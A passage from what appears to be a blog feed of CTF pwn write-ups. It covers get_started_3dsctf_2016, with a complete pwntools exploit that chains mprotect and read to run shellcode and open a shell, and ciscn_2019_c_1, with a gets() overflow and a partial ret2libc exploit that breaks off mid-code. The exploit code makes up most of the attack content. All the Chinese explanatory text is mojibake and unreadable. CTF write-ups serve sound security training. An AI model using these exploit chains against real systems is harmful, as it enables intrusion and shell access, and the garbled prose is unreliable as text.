class="hljs-number">0x804951D</span> <span class="hljs-comment">#ä¸ºäº†åç»­å†èƒ½ä½¿ç”¨æ ˆret,æˆ‘ä»¬å¾—æ„é€ ä¸€ä¸‹æ ˆçš„å¸ƒå±€,å› ä¸ºmprotectå‡½æ•°ä½¿ç”¨åˆ°äº†3ä¸ªå‚æ•°,æˆ‘ä»¬å°±æ‰¾å­˜åœ¨3ä¸ªè¿ç»­popçš„æŒ‡ä»¤</span><br>ä¸ºå•¥è¦æ‰¾<span class="hljs-number">3</span>ä¸ªpop,ä¹Ÿå°±æ˜¯åœ¨æ­£å¸¸æƒ…å†µä¸‹,å‡½æ•°ä¼ å‚æ˜¯ä½¿ç”¨pushï¼Œæ‰€ä»¥è¦ä¸ºäº†å †æ ˆè¿˜åŸ,å‡½æ•°è°ƒç”¨ç»“æŸæ—¶å°±ä½¿ç”¨popæ¥ä¿è¯å †æ ˆ<br>å®Œå¥½.<br>mem_addr = <span class="hljs-number">0x80EB000</span> <span class="hljs-comment">#å¯è¯»å¯å†™çš„å†…å­˜,ä½†ä¸å¯æ‰§è¡Œ</span><br>mem_size = <span class="hljs-number">0x1000</span> <span class="hljs-comment">#é€šè¿‡è°ƒè¯•å‡ºæ¥çš„å€¼</span><br>mem_proc = <span class="hljs-number">0x7</span> <span class="hljs-comment">#å¯ä»£è¡¨å¯è¯»å¯å†™å¯æ‰§è¡Œ</span><br>mprotect_addr = elf.symbols[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>read_addr = elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>payload_01 = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x38</span><br>payload_01 += p32(mprotect_addr)<br>payload_01 += p32(pop3_ret) <span class="hljs-comment">#æ‰§è¡Œå®Œmprotectçš„è¿”å›åœ°å€,ä½¿espå¾€ä¸‹+12</span><br><span class="hljs-comment">#mprotect çš„ä¸‰ä¸ªå‚æ•°</span><br>payload_01 += p32(mem_addr) <span class="hljs-comment">#mprotectå‡½æ•°å‚æ•°1 ä¿®æ”¹çš„å†…å­˜åœ°å€</span><br>payload_01 += p32(mem_size) <span class="hljs-comment">#mprotectå‡½æ•°å‚æ•°2 ä¿®æ”¹çš„å†…å­˜å¤§å°</span><br>payload_01 += p32(mem_proc) <span class="hljs-comment">#mprotectå‡½æ•°å‚æ•°3 ä¿®æ”¹çš„æƒé™</span><br>payload_01 += p32(read_addr) <span class="hljs-comment">#æ‰§è¡Œå®Œpop3_retåå¼¹åˆ°readåœ°å€</span><br>payload_01 += p32(pop3_ret) <span class="hljs-comment">#æ‰§è¡Œå®Œreadåå°†è¿”å›åˆ°pop3_retæŒ‡ä»¤,åˆç»§ç»­ä½¿esp+12</span><br><span class="hljs-comment">#read çš„ä¸‰ä¸ªå‚æ•°</span><br>payload_01 += p32(<span class="hljs-number">0</span>) <span class="hljs-comment">#readå‡½æ•°å‚æ•°1 ,ä»è¾“å…¥ç«¯è¯»å–</span><br>payload_01 += p32(mem_addr) <span class="hljs-comment">#è¯»å–åˆ°çš„å†…å®¹å¤åˆ¶åˆ°æŒ‡å‘çš„å†…å­˜é‡Œ</span><br>payload_01 += p32(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#è¯»å–å¤§å°</span><br>payload_01 += p32(mem_addr) <span class="hljs-comment">#æ‰§è¡Œå®Œreadåret esi</span><br>sh.sendline(payload_01)<br>payload_sh = asm(shellcraft.sh(),arch = <span class="hljs-string">&#x27;i386&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>sh.sendline(payload_sh)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>æ¥æºï¼š<a href="https://www.b1ndsec.cn/?p=371">https://www.b1ndsec.cn/?p=371</a></p><h2 id="LYXF-Logan-çš„WP"><a href="#LYXF-Logan-çš„WP" class="headerlink" title="LYXF-Logan çš„WP"></a><a href="https://www.cnblogs.com/lyxf/">LYXF-Logan</a> çš„WP</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs gradle"> ä¿®æ”¹ä½¿ç”¨mprotecå‡½æ•°ä¿®æ”¹å†…å­˜çš„æƒé™ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œ,ç„¶ååœ¨è¯¥å†…å­˜ä¸­å†™å…¥è‡ªå·±çš„shellcode,æ‰§è¡Œè¯¥ä»£ç å³å¯.<br>é¦–å…ˆæŒ‰å…ˆè¯´ä¸€ä¸‹mprotectå‡½æ•°:åŸå‹å¦‚ä¸‹<br><span class="hljs-keyword">int</span> mprotect(<span class="hljs-keyword">void</span> *addr, size_t len, <span class="hljs-keyword">int</span> prot);<br>addr å†…å­˜å¯å§‹åœ°å€<br>len  ä¿®æ”¹å†…å­˜çš„é•¿åº¦<br>prot å†…å­˜çš„æƒé™<br>è¦æƒ³è¾¾åˆ°å†…å­˜å¯æ‰§è¡Œçš„ç›®çš„,æˆ‘ä»¬çœ‹ä¸€ä¸‹å“ªä¸ªå†…å­˜æœ€å¥½ä¿®æ”¹,ä½¿ç”¨edb-debugeræŸ¥çœ‹,æˆ–<br>$ .<span class="hljs-regexp">/ ../I</span>nsertPic &amp;<br>$ cat <span class="hljs-regexp">/proc/</span>[you_pid]/maps æŸ¥çœ‹å†…å­˜åŒºåŸŸ<br>å¯ä»¥æŸ¥çœ‹åˆ°,å†…å­˜å¯è¯»å¯å†™çš„åœ°å€ä¸º: <span class="hljs-number">0</span>x0x80EB000 ,æ‰€ä»¥æˆ‘ä»¬å¯¹è¯¥å†…å­˜è¿›è¡Œå¢åŠ ä¸€ä¸ªæƒé™<br><br>å¦‚ä½•è¿›è¡Œå†…å­˜çš„æƒé™ä¿®æ”¹,æ€è·¯:<br><span class="hljs-number">1</span>.æ ˆæº¢å‡ºret åˆ° mprotectå‡½æ•°åœ°å€,æˆ‘æ¥è§£é‡Šä¸€ä¸‹ <span class="hljs-keyword">call</span> æŒ‡ä»¤, <span class="hljs-keyword">call</span> = <span class="hljs-keyword">push</span> + jmp<br>æ‰€ä»¥ç›´æ¥retåè¦ç•™ä¸€ä¸ªè¿”å›åœ°å€,å› ä¸ºret å°±ç›¸å½“äº jmp åˆ° mprotect,ä¸ºäº†å®Œæ•´çš„å›æ¥,æ‰€ä»¥åœ¨<br>mprotectåœ°å€ååœ¨å‹å…¥ä¸€ä¸ªè¿”å›åœ°å€.<br><span class="hljs-number">2</span>.åœ¨<span class="hljs-number">32</span>ä¸ºç³»ç»Ÿä¸­ä¼ å‚æ˜¯ä½¿ç”¨æ ˆä¼ å‚,æ‹©ç¬¬ä¸€ä¸ªå‚æ•°å…ˆ<span class="hljs-keyword">push</span>,ç¬¬äºŒä¸ªå†<span class="hljs-keyword">push</span>....<br>æ‰€ä»¥åŸºæœ¬çš„payloadå¯ä»¥æ„æ€å¦‚ä¸‹:<br>payload = <span class="hljs-string">&#x27;A&#x27;</span> + <span class="hljs-number">0</span>x38 + p32(mprotect_addr)<br>payaloda += p32(ret_addr) + p32(argu1) + p32(argu2) +p32 (argu3)<br><br>è¿™é‡Œçš„mprotect_addrå°±æ˜¯æˆ‘ä»¬è¦è·³è½¬åˆ°mprotectå‡½æ•°çš„åœ°å€<br>ret_addr ä¸º mprotectå‡½æ•°æ‰§è¡Œå®Œåçš„åœ°å€.<br>argu1 ä¸ºmprotectå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•° (è¢«ä¿®æ”¹å†…å­˜çš„åœ°å€) è®¾ç½®ä¸º <span class="hljs-number">0</span>x0x80EB000 (edb-debugeræŸ¥çœ‹å¾—åˆ°)<br>argu2 ä¸ºmprotectå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•° (è¢«ä¿®æ”¹å†…å­˜çš„å¤§å°) è®¾ç½®ä¸º <span class="hljs-number">0</span>x1000 (<span class="hljs-number">0</span>x1000é€šè¿‡ç¨‹åºå¯åŠ¨æ—¶æŸ¥çœ‹è¯¥å†…å­˜å—çš„å¤§å°çš„åˆ°çš„)<br>argu3 ä¸ºmprotectå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•° (è¢«ä¿®æ”¹å†…å­˜çš„æƒé™) è®¾ç½®ä¸º <span class="hljs-number">7</span> = <span class="hljs-number">4</span> + <span class="hljs-number">2</span> +<span class="hljs-number">1</span> (rwx)<br><br>ä¸ºäº†åç»­å†èƒ½ä½¿ç”¨æ ˆret,æˆ‘ä»¬çš„æ„é€ ä¸€ä¸‹æ ˆçš„å¸ƒå±€,å› ä¸ºmprotectå‡½æ•°ä½¿ç”¨åˆ°äº†<span class="hljs-number">3</span>ä¸ªå‚æ•°,æˆ‘ä»¬å°±æ‰¾å­˜åœ¨<span class="hljs-number">3</span>ä¸ªè¿ç»­<span class="hljs-keyword">pop</span>çš„æŒ‡ä»¤<br>ä¸ºå•¥è¦æ‰¾<span class="hljs-number">3</span>ä¸ª<span class="hljs-keyword">pop</span>,ä¹Ÿå°±æ˜¯åœ¨æ­£å¸¸æƒ…å†µä¸‹,å‡½æ•°ä¼ å‚æ˜¯ä½¿ç”¨<span class="hljs-keyword">push</span>ï¼Œæ‰€ä»¥è¦ä¸ºäº†å †æ ˆè¿˜åŸ,å‡½æ•°è°ƒç”¨ç»“æŸæ—¶å°±ä½¿ç”¨<span class="hljs-keyword">pop</span>æ¥ä¿è¯å †æ ˆ<br>å®Œå¥½.<br><br>ä½¿ç”¨ ROPgadget --binary ../InsertPic --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | <span class="hljs-keyword">grep</span> <span class="hljs-keyword">pop</span><br>å­˜åœ¨<span class="hljs-keyword">pop</span>çš„ä¸€äº›æŒ‡ä»¤åœ°å€,å¯ä»¥å‘ç°:<br><span class="hljs-number">0</span>x0804f460 : <span class="hljs-keyword">pop</span> ebx ; <span class="hljs-keyword">pop</span> esi ; <span class="hljs-keyword">pop</span> ebp ; ret<br>é‚£æˆ‘ä»¬å°±å¾—åˆ°äº†è¯¥åœ°å€.<br>ä¸Šé¢çš„ret_addrå°±å¡«å†™<span class="hljs-number">0</span>x0804f460<br>å¥½ä¸‹é¢æˆ‘ä»¬å°±è¦æ„æ€å¦‚ä½•å°†è‡ªå·±çš„shellcodeå†™å…¥å†…å­˜å†æ‰§è¡Œ,ä½¿ç”¨<span class="hljs-keyword">read</span>å‡½æ•°å†™å…¥.<br><span class="hljs-keyword">read</span>å‡½æ•°åŸå‹:<br>ssize_t <span class="hljs-keyword">read</span>(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">void</span> *buf, size_t <span class="hljs-keyword">count</span>);<br>fd è®¾ä¸º<span class="hljs-number">0</span>æ—¶å°±å¯ä»¥ä»è¾“å…¥ç«¯è¯»å–å†…å®¹<br>buf è®¾ä¸ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å†…å­˜åœ°å€<br><span class="hljs-keyword">size</span> é€‚å½“å¤§å°å°±å¯ä»¥<br><br>...................<br></code></pre></td></tr></table></figure><h4 id="æœ€ç»ˆexpå¦‚ä¸‹"><a href="#æœ€ç»ˆexpå¦‚ä¸‹" class="headerlink" title="æœ€ç»ˆexpå¦‚ä¸‹:"></a>æœ€ç»ˆexpå¦‚ä¸‹:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br>sh = elf.process()<br>sh = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="hljs-number">28576</span>)<br><br>pop3_ret = <span class="hljs-number">0x804951D</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">pop esi</span><br><span class="hljs-string">pop edi</span><br><span class="hljs-string">pop ebp</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>esi = <span class="hljs-number">0x80EB000</span> <span class="hljs-comment">#å¯è¯»å¯å†™çš„å†…å­˜,ä½†ä¸å¯æ‰§è¡Œ</span><br>edi = <span class="hljs-number">0x1000</span>    <span class="hljs-comment">#é€šè¿‡è°ƒè¯•å‡ºæ¥çš„å€¼</span><br>ebp = <span class="hljs-number">0x7</span>       <span class="hljs-comment">#å¯ä»£è¡¨å¯è¯»å¯å†™å¯æ‰§è¡Œ</span><br><br>mprotect_addr = elf.symbols[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>read_addr = elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">ä¸ºäº†è¿ç»­åœ¨å †æ ˆä¸­æ‰§è¡Œ,å°±æ˜¯ç”¨pop3_retæ¥æ§åˆ¶esp,ä½¿å®ƒå¾€ä¸‹å¼¹æ‰å·²ç”¨çš„3ä¸ªå€¼.</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload_01 = <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x38</span><br>payload_01 += p32(mprotect_addr)<br>payload_01 += p32(pop3_ret) <span class="hljs-comment">#æ‰§è¡Œå®Œmprotectçš„è¿”å›åœ°å€,ä½¿espå¾€ä¸‹+12</span><br><br><span class="hljs-comment">#mprotect çš„ä¸‰ä¸ªå‚æ•°</span><br>payload_01 += p32(esi)   <span class="hljs-comment">#mprotectå‡½æ•°å‚æ•°1 ä¿®æ”¹çš„å†…å­˜åœ°å€</span><br>payload_01 += p32(edi)   <span class="hljs-comment">#mprotectå‡½æ•°å‚æ•°2 ä¿®æ”¹çš„å†…å­˜å¤§å°</span><br>payload_01 += p32(ebp)   <span class="hljs-comment">#mprotectå‡½æ•°å‚æ•°3 ä¿®æ”¹çš„æƒé™</span><br><br>payload_01 += p32(read_addr) <span class="hljs-comment">#æ‰§è¡Œå®Œpop3_retåå¼¹åˆ°readåœ°å€</span><br><br>payload_01 += p32(pop3_ret)  <span class="hljs-comment">#æ‰§è¡Œå®Œreadåå°†è¿”å›åˆ°pop3_retæŒ‡ä»¤,åˆç»§ç»­ä½¿esp+12</span><br><br><span class="hljs-comment">#read çš„ä¸‰ä¸ªå‚æ•°</span><br>payload_01 += p32(<span class="hljs-number">0</span>)     <span class="hljs-comment">#readå‡½æ•°å‚æ•°1 ,ä»è¾“å…¥ç«¯è¯»å–</span><br>payload_01 += p32(esi)   <span class="hljs-comment">#è¯»å–åˆ°çš„å†…å®¹å¤åˆ¶åˆ°æŒ‡å‘çš„å†…å­˜é‡Œ</span><br>payload_01 += p32(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#è¯»å–å¤§å°</span><br><br>payload_01 += p32(esi)   <span class="hljs-comment">#æ‰§è¡Œå®Œreadåret esi</span><br><br>sh.sendline(payload_01)<br>payload_sh = asm(shellcraft.sh(),arch = <span class="hljs-string">&#x27;i386&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>) <br><br>sh.sendline(payload_sh)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><p><a href="http://www.bubuko.com/infodetail-3355135.html">get_started_3dsctf_2016-Pwn</a></p><p>æ ‡ç­¾ï¼š<a href="http://www.bubuko.com/so/1/active">active</a>  <a href="http://www.bubuko.com/so/1/bin">bin</a>  <a href="http://www.bubuko.com/so/1/lag">lag</a>  <a href="http://www.bubuko.com/so/1/å¤§å°">å¤§å°</a>  <a href="http://www.bubuko.com/so/1/art">art</a>  <a href="http://www.bubuko.com/so/1/ger">ger</a>  </p><p>åŸæ–‡ï¼š<a href="https://www.cnblogs.com/lyxf/p/12113401.html">https://www.cnblogs.com/lyxf/p/12113401.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buu-ciscn_2019-c_1 WP</title>
    <link href="/2020/01/13/buu-ciscn_2019-c_1%20WP/"/>
    <url>/2020/01/13/buu-ciscn_2019-c_1%20WP/</url>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// local variable allocation has failed, the output may be wrong!</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  init(*(_QWORD *)&amp;argc, argv, envp);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EEEEEEE                            hh      iii                &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;====================================================================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to this Encryption machine\n&quot;</span>);<br>  begin();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      fflush(<span class="hljs-number">0LL</span>);<br>      v4 = <span class="hljs-number">0</span>;<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v4);<br>      getchar();<br>      <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I think you can do it by yourself&quot;</span>);<br>      begin();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">3</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye!&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    encrypt();<br>    begin();<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Something Wrong!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">begin</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;====================================================================&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.Encrypt&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.Decrypt&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.Exit&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your choice!&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">encrypt</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">size_t</span> v0; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">48</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h]</span><br>  __int16 v3; <span class="hljs-comment">// [rsp+30h] [rbp-20h]</span><br><br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s));<br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v0 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)x;<br>    <span class="hljs-keyword">if</span> ( v0 &gt;= <span class="hljs-built_in">strlen</span>(s) )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( s[x] &lt;= <span class="hljs-number">96</span> || s[x] &gt; <span class="hljs-number">122</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( s[x] &lt;= <span class="hljs-number">64</span> || s[x] &gt; <span class="hljs-number">90</span> )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( s[x] &gt; <span class="hljs-number">47</span> &amp;&amp; s[x] &lt;= <span class="hljs-number">57</span> )<br>          s[x] ^= <span class="hljs-number">0xF</span>u;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        s[x] ^= <span class="hljs-number">0xE</span>u;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      s[x] ^= <span class="hljs-number">0xD</span>u;<br>    &#125;<br>    ++x;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Ciphertext&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(s);<br>&#125;<br></code></pre></td></tr></table></figure><p>å‘ç°gets(s);è¿™æ ·å°±å¥½åŠäº†ï¼Œéšåé‚£ä¸ªåŠ å¯†å°±ä¸ç”¨ç®¡äº†ã€‚</p><p>çœ‹çœ‹ç¨‹åºé‡Œè¾¹æœ‰æ— system(â€œ\bin\shâ€)</p><p>![image-20191215140307281](buu-ciscn_2019-c_1 WP/image-20191215140307281.png)</p><p>æ²¡æœ‰ï¼Œé‚£å°±åªèƒ½é€šè¿‡libcæ¥è®¡ç®—äº†</p><p>æˆ‘ä»¬çŸ¥é“äº†libï¼Œæœ‰äº†putså‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥leak libcçš„èµ·å§‹åœ°å€ï¼Œè®¡ç®—libcåœ°å€ï¼Œæ­¤æ—¶systemå’Œbinshéƒ½æ˜¯åµŒå…¥åˆ°äº†å†…å­˜å½“ä¸­çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±åŠ ä¸Šåç§»å³å¯è°ƒç”¨</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>sh = process(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)<br><span class="hljs-comment">#sh = remote(&quot;node3.buuoj.cn&quot;,25817)</span><br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>) <span class="hljs-comment">#idaé‡Œå¯ä»¥çœ‹è§</span><br>sh.recvuntil(<span class="hljs-string">&quot;!&quot;</span>)<br>sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;ted&quot;</span>)<br>offset = <span class="hljs-number">87</span> <span class="hljs-comment">#idaåŒå‡»gets(s)çœ‹å¾—æ˜¯0x50ï¼ŒåŠ ä¸Šå‰é¢çš„\x00å°±æ˜¯80+8</span><br>pop_rdi_ret = elf.search(asm(<span class="hljs-string">&quot;pop rdi\nret\n&quot;</span>)).<span class="hljs-built_in">next</span>()<br>payload = <span class="hljs-string">&#x27;\x00&#x27;</span> + offset * <span class="hljs-string">&quot;a&quot;</span><br>payload += p64(pop_rdi_ret)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload += p64(<span class="hljs-number">0x400B28</span>) <span class="hljs-comment">#ç¨‹åºèµ·å§‹åœ°å€</span><br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&quot;Ciphertext&quot;</span>)<br><br>__libc_start_main = u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>libc = __libc_start_main - lib.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>system = libc + lib.symbols[<span 